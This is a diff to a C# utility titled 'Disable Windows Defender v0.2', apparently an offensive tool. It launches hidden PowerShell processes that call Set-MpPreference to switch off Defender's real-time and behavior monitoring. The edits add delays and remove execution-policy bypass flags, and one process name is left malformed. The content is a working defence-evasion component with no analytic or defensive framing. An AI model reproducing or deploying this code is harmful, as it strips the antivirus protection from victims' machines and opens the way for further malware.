@@ -2,7 +2,7 @@
 using System;
 using System.Diagnostics;
 using System.Security.Principal;
-
+using System.Threading;
 
 //       │ Author     : NYAN CAT
 //       │ Name       : Disable Windows Defender v0.2
@@ -35,11 +35,13 @@ namespace Disable_Windows_Defender
             }
             catch { }
 
+            Thread.Sleep(100);
+
             try
             {
                 ProcessStartInfo ps = new ProcessStartInfo();
                 ps.FileName = "powershell.exe";
-                ps.Arguments = "-executionpolicy bypass -windowstyle hidden Set-MpPreference -DisableRealtimeMonitoring $true";
+                ps.Arguments = " Set-MpPreference -DisableRealtimeMonitoring $true";
                 ps.WindowStyle = ProcessWindowStyle.Hidden;
                 Process process = new Process();
                 process.StartInfo = ps;
@@ -47,11 +49,13 @@ namespace Disable_Windows_Defender
             }
             catch { }
 
+            Thread.Sleep(100);
+
             try
             {
                 ProcessStartInfo ps = new ProcessStartInfo();
                 ps.FileName = "powershell.exe -executionpolicy";
-                ps.Arguments = "-executionpolicy bypass -windowstyle hidden Set-MpPreference -DisableBehaviorMonitoring $true";
+                ps.Arguments = " Set-MpPreference -DisableBehaviorMonitoring $true";
                 ps.WindowStyle = ProcessWindowStyle.Hidden;
                 Process process = new Process();
                 process.StartInfo = ps;
